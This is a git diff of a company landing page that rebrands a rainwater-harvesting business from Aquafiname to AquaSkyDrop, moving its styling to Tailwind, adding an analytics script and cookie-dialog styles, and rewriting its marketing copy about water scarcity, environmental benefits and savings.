@@ -1,688 +1,803 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script defer data-domain="aquaskydrop.vercel.app" src="https://plausible.io/js/script.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aquafiname - Smarter Water. Greener Living.</title>
-    <!-- Google Fonts - Inter for modern typography -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>AquaSkyDrop — Harvest the Sky. Sustain the Future.</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts - Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* General Body Styles */
+        /* Custom Tailwind Configuration (Optional, but good for consistency) */
+        :root {
+            --skydrop-blue: #4FC3F7;
+            --ecoleaf-green: #66BB6A;
+            --cool-slate-gray: #455A64;
+            --pure-white: #FAFAFA;
+            --silver-mist: #CFD8DC;
+        }
+
+      
+
+
+
         body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: url('https://via.placeholder.com/1200x800') no-repeat center center/cover;
+      height: 100vh;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      backdrop-filter: blur(5px);
+      background: rgba(0, 0, 0, 0.5);
+    }
+
+    .dialog-box {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #1c1c1c;
+      color: white;
+      padding: 30px;
+      border-radius: 20px;
+      width: 400px;
+      box-shadow: 0 0 25px rgba(0,0,0,0.6);
+      text-align: center;
+      transition: 0.3s;
+    }
+
+    .dialog-box:hover {
+      cursor: pointer;
+    }
+
+    .dialog-box h2 {
+      margin-top: 0;
+      font-size: 1.6em;
+      color: #fff;
+    }
+
+    .dialog-box p {
+      font-size: 1em;
+      line-height: 1.6em;
+      color: #ccc;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+      gap: 15px;
+    }
+
+    .buttons button {
+      padding: 10px 25px;
+      border: none;
+      border-radius: 25px;
+      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .accept {
+      background-color: #00cc66;
+      color: white;
+    }
+
+    .deny {
+      background-color: #e53935;
+      color: white;
+    }
+
+    .policy-link {
+      margin-top: 15px;
+      display: block;
+      color: #00bcd4;
+      text-decoration: none;
+      font-size: 0.9em;
+    }
+
+
+
+
+        
             font-family: 'Inter', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #FAFAFA; /* Cloud White */
-            color: #455A64; /* Graphite Gray for text */
-            line-height: 1.6;
-            scroll-behavior: smooth;
+            background-color: var(--pure-white);
+            color: var(--cool-slate-gray);
         }
 
-        /* Container for content centering and max-width */
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
+        /* Custom utility classes for colors */
+        .bg-skydrop-blue { background-color: var(--skydrop-blue); }
+        .text-skydrop-blue { color: var(--skydrop-blue); }
+        .bg-ecoleaf-green { background-color: var(--ecoleaf-green); }
+        .text-ecoleaf-green { color: var(--ecoleaf-green); }
+        .bg-cool-slate-gray { background-color: var(--cool-slate-gray); }
+        .text-cool-slate-gray { color: var(--cool-slate-gray); }
+        .bg-pure-white { background-color: var(--pure-white); }
+        .text-pure-white { color: var(--pure-white); }
+        .bg-silver-mist { background-color: var(--silver-mist); }
+        .text-silver-mist { color: var(--silver-mist); }
+
+        /* General button styling */
+        .btn-primary {
+            @apply bg-skydrop-blue text-pure-white px-6 py-3 rounded-full font-semibold hover:bg-opacity-90 transition duration-300 shadow-lg;
         }
-
-        /* Header Styles */
-        header {
-            background-color: #0288D1; /* Pure Water Blue */
-            color: #FAFAFA;
-            padding: 15px 0;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
+        .btn-secondary {
+            @apply bg-ecoleaf-green text-pure-white px-6 py-3 rounded-full font-semibold hover:bg-opacity-90 transition duration-300 shadow-lg;
         }
-
-        header .container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-size: 2.2em;
-            font-weight: 700;
-            color: #FAFAFA;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            border-radius: 8px; /* Rounded corners for logo area */
-            padding: 5px 10px;
-            background-color: rgba(255, 255, 255, 0.1);
-        }
-
-        .logo-icon {
-            /* Abstract water droplet with geometric refinement */
-            width: 30px;
-            height: 30px;
-            margin-right: 10px;
-            background-color: #66BB6A; /* Leaf Green accent */
-            border-radius: 50%;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-        }
-
-        .logo-icon::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) rotate(45deg);
-            width: 70%;
-            height: 70%;
-            background-color: #B3E5FC; /* Aqua Light Blue */
-            border-radius: 30%;
-        }
-
-        nav ul {
-            list-style: none;
-            margin: 0;
-            padding: 0;
-            display: flex;
-        }
-
-        nav ul li {
-            margin-left: 30px;
-        }
-
-        nav ul li a {
-            color: #FAFAFA;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 1.1em;
-            padding: 8px 15px;
-            border-radius: 8px; /* Rounded corners for nav items */
-            transition: background-color 0.3s ease, color 0.3s ease;
-        }
-
-        nav ul li a:hover,
-        nav ul li a.active {
-            background-color: #B3E5FC; /* Aqua Light Blue */
-            color: #0288D1; /* Pure Water Blue */
-        }
-
-        /* Hero Section */
-        #hero {
-            background: linear-gradient(rgba(2, 136, 209, 0.8), rgba(2, 136, 209, 0.6)), url('p1.avif') no-repeat center center/cover;
-            color: #FAFAFA;
-            text-align: center;
-            padding: 100px 20px;
-            min-height: 600px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            border-bottom-left-radius: 20px; /* Rounded corners for hero */
-            border-bottom-right-radius: 20px;
-            margin-bottom: 40px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
-        }
-
-        #hero h1 {
-            font-size: 3.8em;
-            margin-bottom: 20px;
-            font-weight: 700;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
-
-        #hero p {
-            font-size: 1.5em;
-            margin-bottom: 40px;
-            max-width: 800px;
-            opacity: 0.9;
-        }
-
-        .cta-buttons {
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .cta-button {
-            display: inline-block;
-            background-color: #66BB6A; /* Leaf Green */
-            color: #FAFAFA;
-            padding: 15px 30px;
-            text-decoration: none;
-            border-radius: 10px; /* Rounded corners for buttons */
-            font-weight: 600;
-            font-size: 1.2em;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-        }
-
-        .cta-button:hover {
-            background-color: #5cb85c; /* Slightly darker green */
-            transform: translateY(-3px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
-        }
-
-        /* Section Styling */
-        section {
-            padding: 60px 0;
-            margin-bottom: 40px;
-            background-color: #FAFAFA;
-            border-radius: 15px; /* Rounded corners for sections */
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-        }
-
-        section:nth-of-type(even) {
-            background-color: #F0F4F7; /* Light gray for alternating sections */
-        }
-
-        section h2 {
-            font-size: 2.8em;
-            color: #0288D1; /* Pure Water Blue */
-            text-align: center;
-            margin-bottom: 40px;
-            font-weight: 700;
-            position: relative;
-            padding-bottom: 15px;
-        }
-
-        section h2::after {
-            content: '';
-            position: absolute;
-            left: 50%;
-            bottom: 0;
-            transform: translateX(-50%);
-            width: 80px;
-            height: 4px;
-            background-color: #66BB6A; /* Leaf Green accent */
-            border-radius: 2px;
-        }
-
-        section h3 {
-            font-size: 2em;
-            color: #455A64; /* Graphite Gray */
-            margin-top: 30px;
-            margin-bottom: 20px;
-            font-weight: 600;
-        }
-
-        section p {
-            font-size: 1.1em;
-            margin-bottom: 20px;
-            color: #455A64;
-        }
-
-        section ul {
-            list-style: none;
-            padding: 0;
-            margin-bottom: 20px;
-        }
-
-        section ul li {
-            background-color: #E0F2F7; /* Aqua Light Blue very light */
-            margin-bottom: 10px;
-            padding: 15px 20px;
-            border-left: 5px solid #0288D1; /* Pure Water Blue accent */
-            border-radius: 8px; /* Rounded corners for list items */
-            font-size: 1.1em;
-            color: #455A64;
-            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);
-        }
-
-        .grid-layout {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-            margin-top: 40px;
-        }
-
-        .grid-item {
-            background-color: #FAFAFA;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .grid-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12);
-        }
-
-        .grid-item h3 {
-            color: #0288D1;
-            font-size: 1.8em;
-            margin-top: 0;
-            margin-bottom: 15px;
-        }
-
-        .grid-item p {
-            font-size: 1em;
-            color: #455A64;
-        }
-
-        .service-image {
-            width: 100%;
-            height: 200px;
-            background-color: #B3E5FC; /* Aqua Light Blue placeholder */
-            border-radius: 8px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5em;
-            color: #0288D1;
-            font-weight: 600;
-            overflow: hidden; /* Ensure image fits */
-        }
-
-        .service-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover; /* Cover the area, cropping if necessary */
-            border-radius: 8px;
-        }
-
-
-        /* Contact Form Styling */
-        #contact .contact-form {
-            max-width: 700px;
-            margin: 0 auto;
-            padding: 40px;
-            background-color: #FAFAFA;
-            border-radius: 15px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
-        }
-
-        .contact-form label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #455A64;
-        }
-
-        .contact-form input[type="text"],
-        .contact-form input[type="email"],
-        .contact-form textarea {
-            width: calc(100% - 20px);
-            padding: 12px;
-            margin-bottom: 20px;
-            border: 1px solid #B3E5FC; /* Aqua Light Blue border */
-            border-radius: 8px;
-            font-size: 1em;
-            color: #455A64;
-            background-color: #FAFAFA;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .contact-form input[type="text"]:focus,
-        .contact-form input[type="email"]:focus,
-        .contact-form textarea:focus {
-            border-color: #0288D1; /* Pure Water Blue on focus */
-            box-shadow: 0 0 0 3px rgba(2, 136, 209, 0.2);
-            outline: none;
-        }
-
-        .contact-form textarea {
-            resize: vertical;
-            min-height: 120px;
-        }
-
-        .contact-form button {
-            background-color: #0288D1; /* Pure Water Blue */
-            color: #FAFAFA;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.2em;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-        }
-
-        .contact-form button:hover {
-            background-color: #017acb; /* Slightly darker blue */
-            transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
-        }
-
-        /* Footer Styles */
-        footer {
-            background-color: #455A64; /* Graphite Gray */
-            color: #FAFAFA;
-            padding: 40px 0;
-            text-align: center;
-            border-top-left-radius: 20px; /* Rounded corners for footer */
-            border-top-right-radius: 20px;
-            margin-top: 60px;
-            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        footer p {
-            margin: 10px 0;
-            font-size: 0.95em;
-            opacity: 0.9;
-        }
-
-        footer .social-links a {
-            color: #FAFAFA;
-            font-size: 1.8em;
-            margin: 0 15px;
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-
-        footer .social-links a:hover {
-            color: #66BB6A; /* Leaf Green on hover */
-        }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            header .container {
-                flex-direction: column;
-                text-align: center;
-            }
-
-            nav ul {
-                flex-direction: column;
-                margin-top: 15px;
-            }
-
-            nav ul li {
-                margin: 10px 0;
-            }
-
-            #hero h1 {
-                font-size: 2.8em;
-            }
-
-            #hero p {
-                font-size: 1.2em;
-            }
-
-            .cta-buttons {
-                flex-direction: column;
-                gap: 15px;
-            }
-
-            .cta-button {
-                width: 80%;
-                margin: 0 auto;
-            }
-
-            section h2 {
-                font-size: 2.2em;
-            }
-
-            section h3 {
-                font-size: 1.6em;
-            }
-
-            .grid-layout {
-                grid-template-columns: 1fr;
-            }
-
-            .contact-form {
-                padding: 20px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .logo {
-                font-size: 1.8em;
-            }
-
-            #hero h1 {
-                font-size: 2em;
-            }
-
-            #hero p {
-                font-size: 1em;
-            }
-
-            section h2 {
-                font-size: 1.8em;
-            }
-
-            section h3 {
-                font-size: 1.4em;
-            }
+        .btn-outline {
+            @apply border border-skydrop-blue text-skydrop-blue px-6 py-3 rounded-full font-semibold hover:bg-skydrop-blue hover:text-pure-white transition duration-300;
         }
     </style>
 </head>
-<body>
-    <header>
-        <div class="container">
-            <a href="index.html" class="logo">
-                <div class="logo-icon"></div>
-                Aquafiname
+<body class="antialiased">
+
+    <!-- Header Section -->
+    <header class="bg-pure-white shadow-md py-4 px-6 md:px-12 fixed w-full z-50 rounded-b-xl">
+        <div class="container mx-auto flex justify-between items-center flex-wrap">
+            <!-- Logo -->
+            <a href="#" class="flex items-center space-x-2 text-cool-slate-gray text-2xl font-bold rounded-lg p-2">
+                <svg class="w-8 h-8 text-skydrop-blue" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+                    <path d="M12 2c-4.41 0-8 3.59-8 8s3.59 8 8 8 8-3.59 8-8-3.59-8-8-8zm0 14c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6zm-1-9h2v4h-2zm0 6h2v2h-2z"/>
+                    <path d="M12 4c-4.41 0-8 3.59-8 8s3.59 8 8 8 8-3.59 8-8-3.59-8-8-8zm0 14c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6z"/>
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+                </svg>
+                <span>AquaSkyDrop</span>
             </a>
-            <nav>
-                <ul>
-                    <li><a href="index.html" class="active">Home</a></li>
-                    <li><a href="privacy.html">Privacy</a></li>
-                    <li><a href="terms.html">Terms</a></li>
-                    <li><a href="cookies.html">Cookies</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                </ul>
+
+            <!-- Navigation -->
+            <nav class="hidden md:flex space-x-8">
+               <a href="index.html" tabindex="0">Home</a>
+        <a href="privacy.html" tabindex="0">Privacy</a>
+        <a href="terms.html" tabindex="0"aria-current="page">Terms & conditons</a>
+        <a href="cookies.html"tabindex="0">Cookies</a>
+        <a href="contact.html" tabindex="0">Contact us</a>
             </nav>
+
+            <!-- Mobile Menu Button -->
+            <button id="mobile-menu-button" class="md:hidden text-cool-slate-gray focus:outline-none">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                </svg>
+            </button>
         </div>
+
     </header>
 
-    <main>
-        <section id="hero">
-            <div class="container">
-                <h1>Smarter Water. Greener Living.</h1>
-                <p>Aquafiname delivers next-generation rainwater harvesting systems designed for urban homes, businesses, and eco-conscious communities. Harvest every drop for a sustainable future.</p>
-                <div class="cta-buttons">
-                    <a href="#solutions" class="cta-button">Explore Our Systems</a>
-                    <a href="#monitoring" class="cta-button">See Water Savings</a>
-                    <a href="#contact" class="cta-button">Request a Consultation</a>
+    <main class="pt-20"> <!-- Adjust padding-top to account for fixed header -->
+
+        <!-- Hero Section -->
+        <section id="home" class="relative bg-gradient-to-br from-skydrop-blue to-blue-300 text-pure-white py-20 md:py-32 overflow-hidden rounded-b-3xl shadow-xl">
+            <div class="absolute inset-0 z-0 opacity-20">
+                <!-- Background pattern/image for hero -->
+                <img src="p1.avif" alt="Rain falling onto rooftops with sleek water tanks" class="w-full h-full object-cover">
+            </div>
+            <div class="container mx-auto px-6 md:px-12 relative z-10 text-center">
+                <h1 class="text-4xl md:text-6xl font-bold leading-tight mb-6 animate-fade-in-up">
+                    Harvest the Sky. Sustain the Future.
+                </h1>
+                <p class="text-lg md:text-xl mb-10 max-w-3xl mx-auto opacity-90 animate-fade-in-up delay-200">
+                    AquaSkyDrop provides next-generation rainwater harvesting systems, making eco-friendly water solutions accessible, efficient, and aesthetically pleasing for every space.
+                </p>
+                <div class="flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-6">
+                    <a href="#solutions" class="btn-primary animate-fade-in-up delay-400">Explore Our Systems</a>
+                    <a href="#calculator" class="btn-outline text-pure-white border-pure-white hover:bg-pure-white hover:text-skydrop-blue animate-fade-in-up delay-600">Calculate Your Water Savings</a>
                 </div>
             </div>
         </section>
 
-        <section id="solutions">
-            <div class="container">
-                <h2>Rainwater Harvesting Solutions</h2>
-                <p>Aquafiname is at the forefront of innovative rainwater harvesting technology, offering a diverse range of solutions tailored to meet the unique demands of modern urban environments. Our systems are meticulously engineered to maximize water collection efficiency, ensure water purity, and provide long-term sustainability benefits for residential, commercial, and industrial applications. We understand that every project is unique, which is why our modular and scalable designs can be seamlessly integrated into existing structures or incorporated into new developments, providing unparalleled flexibility.</p>
+        <!-- Why Rainwater Harvesting? Section -->
+        <section id="why-rwh" class="py-16 md:py-24 bg-pure-white px-6 md:px-12">
+            <div class="container mx-auto">
+                <h2 class="text-3xl md:text-5xl font-bold text-center mb-12 text-cool-slate-gray">Why Rainwater Harvesting?</h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-10">
+                    <!-- Water Scarcity -->
+                    <div class="bg-silver-mist p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <div class="flex items-center mb-4">
+                            <svg class="w-10 h-10 text-skydrop-blue mr-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM11 7h2v6h-2zm0 8h2v2h-2z"/></svg>
+                            <h3 class="text-2xl font-semibold text-cool-slate-gray">Addressing Water Scarcity</h3>
+                        </div>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            The global water crisis is escalating, with billions facing water stress. Climate change, population growth, and urbanization are depleting freshwater sources at an alarming rate. Rainwater harvesting offers a decentralized, sustainable solution, reducing reliance on municipal supplies and vulnerable groundwater reserves. By capturing rain where it falls, we mitigate the strain on existing infrastructure and ensure a more resilient water future for communities worldwide.
+                        </p>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            Every drop collected contributes to a larger reservoir of available water, lessening the burden on over-extracted aquifers and energy-intensive water treatment plants. This proactive approach helps build water security, especially in regions prone to droughts or with limited access to reliable water infrastructure. AquaSkyDrop empowers individuals and organizations to become part of the solution, transforming a common resource into a vital asset.
+                        </p>
+                    </div>
 
-                <h3>Residential Rooftop Systems</h3>
-                <p>For homeowners, Aquafiname provides elegant and highly efficient residential rainwater harvesting systems that transform your rooftop into a valuable water collection surface. These systems are designed with aesthetics and ease of maintenance in mind, ensuring they blend harmoniously with your home's architecture. Beyond simply collecting water, our residential solutions incorporate multi-stage filtration processes to deliver clean, non-potable water suitable for a variety of uses, including landscape irrigation, toilet flushing, car washing, and even laundry. By reducing reliance on municipal water supplies, homeowners can achieve significant savings on their water bills while contributing to local water conservation efforts. Our systems are equipped with smart monitoring capabilities, allowing you to track your water usage and savings in real-time, empowering you to make informed decisions about your water consumption. The installation process is streamlined and minimally invasive, designed to cause the least disruption to your daily life. We offer various tank sizes and configurations to match your specific water needs and available space, from compact underground tanks to sleek above-ground designs. Each component, from the gutter guards to the first flush diverters, is selected for its durability and performance, guaranteeing a reliable and long-lasting system. Furthermore, our residential systems are designed to be low-maintenance, requiring only periodic checks and filter replacements, making sustainable living accessible and convenient for every household.</p>
-                <p>The benefits extend beyond cost savings; by utilizing rainwater, you reduce the strain on local water infrastructure, mitigate stormwater runoff, and minimize your carbon footprint associated with water treatment and transportation. Aquafiname's residential systems are a testament to our commitment to making sustainable water management a practical reality for every home. We also provide comprehensive support, from initial consultation and site assessment to installation and post-installation maintenance services, ensuring a smooth and rewarding experience for our customers. Our experts guide you through the selection process, helping you choose the ideal system components and capacity that align with your household's water demand and local climate patterns. Investing in an Aquafiname residential system is an investment in your home's value, your financial well-being, and the health of the planet.</p>
+                    <!-- Environmental Benefits -->
+                    <div class="bg-silver-mist p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <div class="flex items-center mb-4">
+                            <svg class="w-10 h-10 text-ecoleaf-green mr-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6z"/></svg>
+                            <h3 class="text-2xl font-semibold text-cool-slate-gray">Environmental Stewardship</h3>
+                        </div>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            Rainwater harvesting significantly reduces stormwater runoff, a major contributor to urban flooding and water pollution. By diverting rainwater from storm drains, it prevents pollutants like pesticides, fertilizers, and oil from entering rivers and oceans. This directly improves local water quality and protects aquatic ecosystems. Furthermore, reducing reliance on centralized water treatment means less energy consumption and a smaller carbon footprint.
+                        </p>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            The process of collecting and utilizing rainwater is inherently low-impact. It promotes a healthier hydrological cycle, recharges groundwater tables naturally, and fosters biodiversity by supporting local flora and fauna. AquaSkyDrop systems are designed to integrate seamlessly with the natural environment, promoting ecological balance and contributing to a greener, more sustainable planet. Embrace a solution that benefits both your property and the broader ecosystem.
+                        </p>
+                    </div>
 
-                <h3>Commercial and Industrial Applications</h3>
-                <p>Aquafiname offers robust and high-capacity rainwater harvesting solutions specifically engineered for commercial buildings, industrial facilities, and large-scale urban developments. These systems are designed to handle significant volumes of rainwater runoff from vast roof areas, providing substantial non-potable water sources for applications such as cooling towers, industrial processes, landscape irrigation for large campuses, and toilet flushing in commercial complexes. Our commercial systems are built to withstand the rigorous demands of continuous operation, featuring heavy-duty components, advanced filtration units, and sophisticated pumping and distribution networks. We work closely with architects, urban planners, and facility managers to design bespoke solutions that integrate seamlessly with the building's infrastructure and operational requirements. The economic advantages for businesses are profound, leading to substantial reductions in operational costs by minimizing reliance on expensive municipal water, especially in regions facing water scarcity or rising water tariffs. Beyond the financial benefits, adopting Aquafiname's commercial solutions significantly enhances a company's corporate social responsibility profile, demonstrating a tangible commitment to environmental stewardship and sustainability. This can lead to improved public perception, compliance with green building certifications (like LEED), and potential eligibility for environmental incentives or rebates. Our industrial systems are engineered for resilience and efficiency, capable of providing a consistent supply of water for critical processes, thereby enhancing operational independence and reducing vulnerability to external water supply disruptions. We offer comprehensive project management, from feasibility studies and custom design to installation, commissioning, and ongoing maintenance contracts, ensuring optimal performance and longevity of the system. Each commercial and industrial installation is a testament to Aquafiname's ability to deliver large-scale, impactful water solutions that drive both environmental responsibility and economic efficiency. The scalability of our systems means they can be adapted for anything from a medium-sized office building to a sprawling industrial park, providing a reliable and sustainable water source that contributes to both ecological balance and bottom-line savings. We also provide detailed analytics and reporting on water collection, usage, and savings, allowing businesses to accurately measure their environmental impact and optimize their water management strategies.</p>
-                <p>Furthermore, our advanced commercial systems can be integrated with existing building management systems (BMS), allowing for centralized control and monitoring of water resources. This level of integration provides facility managers with unprecedented insights into water consumption patterns, enabling proactive maintenance and efficient resource allocation. The modular nature of our designs allows for future expansion, ensuring that as a business grows, its water harvesting capabilities can scale accordingly without significant overhaul. We prioritize safety and compliance, ensuring all commercial and industrial installations meet or exceed local and national water quality and building codes. Our team of engineers and technicians possesses extensive experience in complex project execution, delivering solutions that are not only effective but also highly resilient and durable. By implementing Aquafiname's commercial and industrial rainwater harvesting systems, organizations can achieve greater water independence, reduce their environmental footprint, and enhance their reputation as leaders in sustainable practices.</p>
+                    <!-- Financial Savings -->
+                    <div class="bg-silver-mist p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <div class="flex items-center mb-4">
+                            <svg class="w-10 h-10 text-skydrop-blue mr-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM12 10c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
+                            <h3 class="text-2xl font-semibold text-cool-slate-gray">Significant Financial Savings</h3>
+                        </div>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            Imagine cutting your water bill by up to 50% or more! Rainwater harvesting provides a free, readily available water source for non-potable uses such as irrigation, toilet flushing, laundry, and car washing. This drastically reduces your consumption of expensive municipal water, leading to substantial long-term savings for homeowners and businesses. The initial investment in an AquaSkyDrop system quickly pays for itself through reduced utility costs.
+                        </p>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            Beyond direct savings on water bills, many regions offer incentives, rebates, or tax credits for installing rainwater harvesting systems, further enhancing the financial benefits. Businesses can also see reduced operational costs and improved sustainability ratings, which can attract environmentally conscious customers and investors. AquaSkyDrop systems are designed for efficiency, ensuring maximum water capture and minimal waste, maximizing your return on investment.
+                        </p>
+                    </div>
+                </div>
 
-                <h3>Modular, Scalable Designs</h3>
-                <p>The cornerstone of Aquafiname's product philosophy is modularity and scalability. We understand that no two projects are identical, and the demands for water conservation can evolve over time. Our systems are built from a series of interconnected, standardized modules that can be easily expanded or reconfigured to meet changing requirements. This modular approach offers significant advantages: it reduces installation time, minimizes on-site disruption, and allows for cost-effective upgrades or expansions in the future. Whether you are starting with a small residential system and wish to increase its capacity later, or a large industrial client needing to adapt to new production demands, Aquafiname's designs provide the flexibility you need. This adaptability ensures that your investment in sustainable water management remains relevant and effective for decades to come. Our engineers meticulously design each module to integrate seamlessly, ensuring optimal performance across the entire system. This means that adding a new filtration stage, increasing storage capacity, or expanding the distribution network is a straightforward process, avoiding the need for a complete system overhaul. The scalability also means that our solutions are suitable for a wide range of climates and precipitation patterns, as components can be adjusted to handle varying rainfall intensities and storage needs. This flexibility extends to the integration of smart technologies, allowing for easy upgrades to monitoring and control systems as new innovations emerge. By choosing Aquafiname, you are investing in a future-proof water solution that grows with your needs and adapts to environmental changes, providing consistent and reliable water savings. Our modular components are manufactured to the highest standards, ensuring durability and long-term performance, even in challenging environmental conditions. This design philosophy not only simplifies installation and maintenance but also reduces the overall lifetime cost of the system, making sustainable water management a more attractive and accessible option for a broader range of clients. We believe that true sustainability lies in systems that are adaptable and resilient, capable of evolving alongside the needs of our planet and its inhabitants.</p>
-                <p>The inherent flexibility of our modular designs also translates into enhanced redundancy and reliability. Should a specific component require maintenance or replacement, the modular structure allows for isolated servicing without disrupting the entire system's operation. This minimizes downtime and ensures a continuous supply of harvested rainwater. Furthermore, the standardized nature of our modules simplifies inventory management and spare parts availability, making maintenance and repairs more efficient. Our design process begins with a thorough assessment of your site's specific characteristics, including roof area, rainfall patterns, soil conditions, and existing infrastructure. This detailed analysis informs the selection and configuration of the appropriate modules, ensuring a perfectly optimized system for your unique context. The scalability also supports phased implementation for larger projects, allowing clients to spread their investment over time while gradually increasing their water harvesting capacity. This approach is particularly beneficial for large urban developments or industrial complexes where initial capital outlay needs to be carefully managed. Aquafiname's commitment to modular and scalable designs reflects our dedication to providing practical, efficient, and future-ready solutions that empower individuals, businesses, and communities to achieve greater water independence and environmental sustainability. This adaptability is key to addressing the dynamic challenges of water management in a rapidly changing world, offering resilience and efficiency in equal measure.</p>
+                <div class="mt-16 text-center">
+                    <h3 class="text-3xl font-bold text-cool-slate-gray mb-6">The Global Water Challenge: A Deeper Look</h3>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto mb-8">
